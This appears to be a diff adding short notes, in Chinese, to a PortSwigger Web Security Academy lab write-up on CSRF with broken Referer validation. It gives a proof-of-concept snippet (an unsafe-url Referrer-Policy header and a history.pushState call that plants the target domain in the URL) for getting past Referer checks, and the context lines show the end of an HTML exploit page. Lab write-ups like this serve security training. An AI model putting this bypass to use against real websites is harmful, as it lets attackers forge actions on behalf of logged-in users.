@@ -65,3 +65,11 @@ document.location="https://cms-0a1c00870337a02e81195c01008f00dd.web-security-aca
     `</script>`
   `</body>`
 `</html>`
+
+# CSRF with broken Referer validation
+只要批评referer里面有0ac2001f04ff96038516ae3e00c600f0.web-security-academy.net就行
+以下是关键poc，一个在头一个在body
+```
+Referrer-Policy: unsafe-url
+ history.pushState('', '', '/?0ac2001f04ff96038516ae3e00c600f0.web-security-academy.net');
+```
